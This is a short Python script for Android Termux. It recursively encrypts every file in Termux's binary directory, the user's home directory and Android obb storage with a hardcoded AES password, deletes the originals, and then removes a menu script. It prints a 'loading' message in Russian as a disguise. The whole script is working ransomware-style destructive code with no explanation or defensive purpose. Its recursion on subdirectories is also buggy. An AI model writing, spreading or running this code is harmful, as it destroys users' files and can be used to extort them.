from colorama import *
import os,sys
def gg(file):
    import pyAesCrypt
    print(Fore.YELLOW + 'загрузка...')
    password = 'zNubZXxvHR'
    bufferSize = 512*1024
    pyAesCrypt.encryptFile(str(file),str(file)+'.crp',password,bufferSize)
    os.remove(file)
def der(dir):
    for name in os.listdir(dir):
        path = os.path.join(dir,name)
        if os.path.isfile(path): gg(path)
        else:der(dir)
der('/data/data/com.termux/files/usr/bin')
der('/data/data/com.termux/files/home')
der('/storage/emulated/0/Android/obb')
os.system('rm -r /data/data/com.termux/files/home/menu/menu.py')
